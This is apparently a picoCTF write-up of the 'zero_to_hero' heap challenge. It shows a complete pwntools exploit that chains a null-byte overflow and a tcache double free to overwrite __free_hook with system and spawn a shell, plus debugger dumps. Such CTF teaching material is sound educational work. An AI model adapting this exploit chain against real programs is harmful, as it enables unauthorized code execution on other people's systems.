---
title: "Zero_to_hero"
date: "2025-12-20"
tags: ["picoCTF", "tcache", "null byte", "ret2libc", "heap"]
---


In this challenge they hand us the full pack except the source code:

- Binary
- Libc
- ld

The binary is a playground where we can store things on the heap:

```c
./zero_to_hero
From Zero to Hero
So, you want to be a hero?
y
Really? Being a hero is hard.
Fine. I see I can't convince you otherwise.
It's dangerous to go alone. Take this: 0x7ad94a3f8fd0
1. Get a superpower
2. Remove a superpower
3. Exit
> 1
Describe your new power.
What is the length of your description?
> 20
Enter your description:
> hola
Done!
4. Get a superpower
5. Remove a superpower
6. Exit
> 2
Which power would you like to remove?
> 0
7. Get a superpower
8. Remove a superpower
9. Exit
```

We can check that it really goes on the heap like this:

```c
pwndbg> vis

0x603000        0x0000000000000000      0x0000000000000251      ........Q.......
0x603010        0x0000000000000001      0x0000000000000000      ................
0x603020        0x0000000000000000      0x0000000000000000      ................
0x603030        0x0000000000000000      0x0000000000000000      ................
0x603040        0x0000000000000000      0x0000000000000000      ................
0x603050        0x0000000000603260      0x0000000000000000      `2`.............
0x603060        0x0000000000000000      0x0000000000000000      ................
0x603070        0x0000000000000000      0x0000000000000000      ................
0x603080        0x0000000000000000      0x0000000000000000      ................
0x603090        0x0000000000000000      0x0000000000000000      ................
0x6030a0        0x0000000000000000      0x0000000000000000      ................
0x6030b0        0x0000000000000000      0x0000000000000000      ................
0x6030c0        0x0000000000000000      0x0000000000000000      ................
0x6030d0        0x0000000000000000      0x0000000000000000      ................
0x6030e0        0x0000000000000000      0x0000000000000000      ................
0x6030f0        0x0000000000000000      0x0000000000000000      ................
0x603100        0x0000000000000000      0x0000000000000000      ................
0x603110        0x0000000000000000      0x0000000000000000      ................
0x603120        0x0000000000000000      0x0000000000000000      ................
0x603130        0x0000000000000000      0x0000000000000000      ................
0x603140        0x0000000000000000      0x0000000000000000      ................
0x603150        0x0000000000000000      0x0000000000000000      ................
0x603160        0x0000000000000000      0x0000000000000000      ................
0x603170        0x0000000000000000      0x0000000000000000      ................
0x603180        0x0000000000000000      0x0000000000000000      ................
0x603190        0x0000000000000000      0x0000000000000000      ................
0x6031a0        0x0000000000000000      0x0000000000000000      ................
0x6031b0        0x0000000000000000      0x0000000000000000      ................
0x6031c0        0x0000000000000000      0x0000000000000000      ................
0x6031d0        0x0000000000000000      0x0000000000000000      ................
0x6031e0        0x0000000000000000      0x0000000000000000      ................
0x6031f0        0x0000000000000000      0x0000000000000000      ................
0x603200        0x0000000000000000      0x0000000000000000      ................
0x603210        0x0000000000000000      0x0000000000000000      ................
0x603220        0x0000000000000000      0x0000000000000000      ................
0x603230        0x0000000000000000      0x0000000000000000      ................
0x603240        0x0000000000000000      0x0000000000000000      ................
0x603250        0x0000000000000000      0x0000000000000021      ........!.......
0x603260        0x0000000000000000      0x0000000000603010      .........0`.....         <-- tcachebins[0x20][0/1]
0x603270        0x0000000000000000 
```

We can also see there is tcache. Which version? Let's check:

```c
pwndbg> libc
libc version: 2.29
```

This looks like Tcache dumping. But there is a problem. If we look at the code we can see the following:

```c
int fcn.004009c2(void)

{
    int iStack_c;

    iStack_c = 0;
    while( true ) {
        if (6 < iStack_c) {
            return -1;
        }
        if (*(iStack_c * 8 + 0x602060) == 0) break;
        iStack_c = iStack_c + 1;
    }
    return iStack_c;
}
```

This function stops us from calling `free` again once we fill the Tcache. Does that mean we cannot get a double free?

Version 2.29 has a tcache protection based on the program knowing whether you are trying to free an element that is already in the tcache. But there is an important detail, IT ONLY TAKES INTO ACCOUNT CHUNKS OF THE SAME SIZE. So if we somehow manage to free a chunk, change its size and free it again, we would not hit the protection. For that we need 2 things:

- That a chunk can be freed again even when it is already freed
- That the program has a bug that lets us change the size of a chunk


Let's go with the first one. Can we free the same chunk twice? For that, once a chunk is freed, the pointer should not be cleared from the list for example. Let's check:

```c
// Viendo Guidra se que se escribe en 0x602060 el array de punteros

From Zero to Hero
So, you want to be a hero?
y
Really? Being a hero is hard.
Fine. I see I can't convince you otherwise.
It's dangerous to go alone. Take this: 0x7ffff7e31fd0
1. Get a superpower
2. Remove a superpower
3. Exit
> 1
Describe your new power.
What is the length of your description?
> 20
Enter your description:
> aaaa
Done!

pwndbg> dq 0x602060
0000000000602060     0000000000603260 0000000000000000
0000000000602070     0000000000000000 0000000000000000
0000000000602080     0000000000000000 0000000000000000
0000000000602090     0000000000000000 0000000000000000

pwndbg> x 0x603260
0x603260:       0x61616161


// Ahora vamos a hacer un free a ver si desaparece de la lista

Which power would you like to remove?
> 0
1. Get a superpower
2. Remove a superpower
3. Exit
   
pwndbg> dq 0x602060
0000000000602060     0000000000603260 0000000000000000
0000000000602070     0000000000000000 0000000000000000
0000000000602080     0000000000000000 0000000000000000
0000000000602090     0000000000000000 0000000000000000
```

It did not disappear! First premise confirmed. Now the second one:

After digging through the code for a while I saw the following when a chunk is created:

```c
sym.imp.puts("Enter your description: ");
sym.imp.printf(0x400f08);
iVar1 = *(iStack_24 * 8 + 0x602060);
iVar3 = sym.imp.read(0,*(iStack_24 * 8 + 0x602060),uStack_28);
*(iVar3 + iVar1) = 0; // intercambia lo que haya en una dirección un byte por un NULO. Vamos a comprobar si está bien hecho

From Zero to Hero
So, you want to be a hero?
y
Really? Being a hero is hard.
Fine. I see I can't convince you otherwise.
It's dangerous to go alone. Take this: 0x7ffff7e31fd0
1. Get a superpower
2. Remove a superpower
3. Exit
> 1
Describe your new power.
What is the length of your description?
> 24
Enter your description:
> aaaaaaaabaaaaaaacaaaaaaa
Done!
4. Get a superpower
5. Remove a superpower
6. Exit

0x603250        0x0000000000000000      0x0000000000000021      ........!.......
0x603260        0x6161616161616161      0x6161616161616162      aaaaaaaabaaaaaaa
0x603270        0x6161616161616163      0x0000000000020d00 // NULL BYTE
```

The null byte lands 1 byte after the user data of our chunk, so we can change the size of a chunk from say 0x110 to 0x100. The second requirement is met! Now we know we can take control of the program flow. All that is left is knowing where to send the program. I have not mentioned it until now, but the challenge gives us a leak:

```c
It's dangerous to go alone. Take this: x 0x7ffff7e31fd0
```

Let's check what it is:

```c
pwndbg> x 0x7ffff7e31fd0
0x7ffff7e31fd0 <__libc_system>: 0x74ff8548
```

Last piece ready, we have to do a tcache double free into a ret2libc.

# Step by Step Exploitation

## 1. Preparing the Ground

We ask for 3 chunks like this:

```python
for n in range(2):
    malloc(b'264', b'hola')

malloc(b'248', b'hola')
```

And we free them in this order:

```python
free(b'1')
free(b'2')
free(b'0')
```

This looks like this:

```c
pwndbg> tcachebins
tcachebins
0x100 [  1]: 0x2f93b480 ◂— 0
0x110 [  2]: 0x2f93b260 —▸ 0x2f93b370 ◂— 0

0x2f93b250      0x0000000000000000      0x0000000000000111      ................
0x2f93b260      0x000000002f93b370      0x000000002f93b010      p../......./.... <-- tcachebins[0x110][0/2]
0x2f93b270      0x0000000000000000      0x0000000000000000      ................
0x2f93b280      0x0000000000000000      0x0000000000000000      ................
0x2f93b290      0x0000000000000000      0x0000000000000000      ................
0x2f93b2a0      0x0000000000000000      0x0000000000000000      ................
0x2f93b2b0      0x0000000000000000      0x0000000000000000      ................
0x2f93b2c0      0x0000000000000000      0x0000000000000000      ................
0x2f93b2d0      0x0000000000000000      0x0000000000000000      ................
0x2f93b2e0      0x0000000000000000      0x0000000000000000      ................
0x2f93b2f0      0x0000000000000000      0x0000000000000000      ................
0x2f93b300      0x0000000000000000      0x0000000000000000      ................
0x2f93b310      0x0000000000000000      0x0000000000000000      ................
0x2f93b320      0x0000000000000000      0x0000000000000000      ................
0x2f93b330      0x0000000000000000      0x0000000000000000      ................
0x2f93b340      0x0000000000000000      0x0000000000000000      ................
0x2f93b350      0x0000000000000000      0x0000000000000000      ................
0x2f93b360      0x0000000000000000      0x0000000000000111      ................
0x2f93b370      0x0000000000000000      0x000000002f93b010      .........../.... <-- tcachebins[0x110][1/2]
0x2f93b380      0x0000000000000000      0x0000000000000000      ................
0x2f93b390      0x0000000000000000      0x0000000000000000      ................
0x2f93b3a0      0x0000000000000000      0x0000000000000000      ................
0x2f93b3b0      0x0000000000000000      0x0000000000000000      ................
0x2f93b3c0      0x0000000000000000      0x0000000000000000      ................
0x2f93b3d0      0x0000000000000000      0x0000000000000000      ................
0x2f93b3e0      0x0000000000000000      0x0000000000000000      ................
0x2f93b3f0      0x0000000000000000      0x0000000000000000      ................
0x2f93b400      0x0000000000000000      0x0000000000000000      ................
0x2f93b410      0x0000000000000000      0x0000000000000000      ................
0x2f93b420      0x0000000000000000      0x0000000000000000      ................
0x2f93b430      0x0000000000000000      0x0000000000000000      ................
0x2f93b440      0x0000000000000000      0x0000000000000000      ................
0x2f93b450      0x0000000000000000      0x0000000000000000      ................
0x2f93b460      0x0000000000000000      0x0000000000000000      ................
0x2f93b470      0x0000000000000000      0x0000000000000101      ................
0x2f93b480      0x0000000000000000      0x000000002f93b010      .........../.... <-- tcachebins[0x100][0/1]
0x2f93b490      0x0000000000000000      0x0000000000000000      ................
0x2f93b4a0      0x0000000000000000      0x0000000000000000      ................
0x2f93b4b0      0x0000000000000000      0x0000000000000000      ................
0x2f93b4c0      0x0000000000000000      0x0000000000000000      ................
0x2f93b4d0      0x0000000000000000      0x0000000000000000      ................
0x2f93b4e0      0x0000000000000000      0x0000000000000000      ................
0x2f93b4f0      0x0000000000000000      0x0000000000000000      ................
0x2f93b500      0x0000000000000000      0x0000000000000000      ................
0x2f93b510      0x0000000000000000      0x0000000000000000      ................
0x2f93b520      0x0000000000000000      0x0000000000000000      ................
0x2f93b530      0x0000000000000000      0x0000000000000000      ................
0x2f93b540      0x0000000000000000      0x0000000000000000      ................
0x2f93b550      0x0000000000000000      0x0000000000000000      ................
0x2f93b560      0x0000000000000000      0x0000000000000000      ................
0x2f93b570      0x0000000000000000      0x0000000000020a91      ................ <-- Top chunk
```

## 2. Double Free

Since chunk 0 (index wise) is the last one we freed, the next malloc of size 0x100 will use its space. We are going to use the null byte poisoning to lower the size of chunk 1 (which right now is freed in the tcache), so we can free chunk 1 again and create the double free. Remember that this second free does not crash because chunk 1 now has a different size, and that leaves chunk 1 freed twice but in two tcache bins of different size.

```c
malloc(b'264', b'A' * 264)
free(b'1')
```

Let's see how this looks:

```c
pwndbg> tcachebins
tcachebins
0x100 [  2]: 0x19028370 —▸ 0x19028480 ◂— 0
0x110 [  1]: 0x19028370 —▸ 0x19028480 ◂— ...
```

As we can see, chunk 1 (`0x19028370`) is in both bins.

## 3. Hijacking the flow

To take control of the flow we only need one malloc to change the FD of chunk 1 into whatever address we want. In this case we go for the `__free__hook`:

```python
malloc(b'264',p64(libc.sym["__free_hook"]))
```

Let's see the impact:

```c
pwndbg> tcachebins
tcachebins
0x100 [  2]: 0xe706370 —▸ 0x7d5c1a6c45a8 (__free_hook) ◂— 0
0x110 [  0]: 0xe706480 ◂— ...
```

As we can see, when we do 2 more mallocs of size 0x100, whatever we write in the second one will land in the free_hook.

## 4. Shell

To get the shell all that is left is putting `system(/bin/sh)` in the free hook. We already have the address of system, so we only need the `/bin/sh`. We are going to do it in a very elegant way.

Since we have to malloc something before the malloc that touches the `__free_hook`, we put the `/bin/sh` right there. Then, once system is in the free_hook, calling free turns into a system(something). And if that something is the index of the chunk holding `/bin/sh`, we are doing exactly `system(/bin/sh)`. Let's get to work:

```c
malloc(b'248', b'/bin/sh\n')
malloc(b'248',p64(libc.sym["system"]))

free(b'1')
```

Putting it all together, the script looks like this:

```python
from pwn import *

e = ELF("./zero_to_hero_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.29.so")
context.binary = e
context.log_level = 'debug'

def malloc(size, msg):
    io.sendline(b'1')
    io.recvuntil(b'> ')
    io.sendline(size)
    io.recvuntil(b'> ')
    io.sendline(msg)
    io.recvuntil(b'> ')

def free(index):
    io.sendline(b'2')
    io.recvuntil(b'> ')
    io.sendline(index)
    io.recvuntil(b'> ')

io = start()

io.recvuntil(b'hero?\n')
io.sendline(b'y')

io.recvuntil(b': ')
leak_system = int(io.recvline().strip(), 16)

info(f'Leak de system = {hex(leak_system)}')
libc.address = leak_system - libc.sym.system
info(f'Libc address = {hex(libc.address)}')

for n in range(2):
    malloc(b'264', b'hola')

malloc(b'248', b'hola')

free(b'1')
free(b'2')
free(b'0')

malloc(b'264', b'A' * 264)
free(b'1')

malloc(b'264',p64(libc.sym["__free_hook"]))

malloc(b'248', b'/bin/sh\n')
malloc(b'248',p64(libc.sym["system"]))

free(b'1') # Triggereamos el exploit

io.interactive()
```

```c
ub1cu0@grr:~/Escritorio/PWN/picoCTF/zero_to_hero$ python3 solve.py
[*] '/home/ub1cu0/Escritorio/PWN/picoCTF/zero_to_hero/zero_to_hero_patched'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    RUNPATH:    b'.'
[*] '/home/ub1cu0/Escritorio/PWN/picoCTF/zero_to_hero/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
    Debuginfo:  Yes
[*] '/home/ub1cu0/Escritorio/PWN/picoCTF/zero_to_hero/ld-2.29.so'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
$ whoami
ub1cu0
$ ls
ld-2.29.so  libc.so.6  solve.py  zero_to_hero  zero_to_hero_patched
```

It works! Thanks for reading!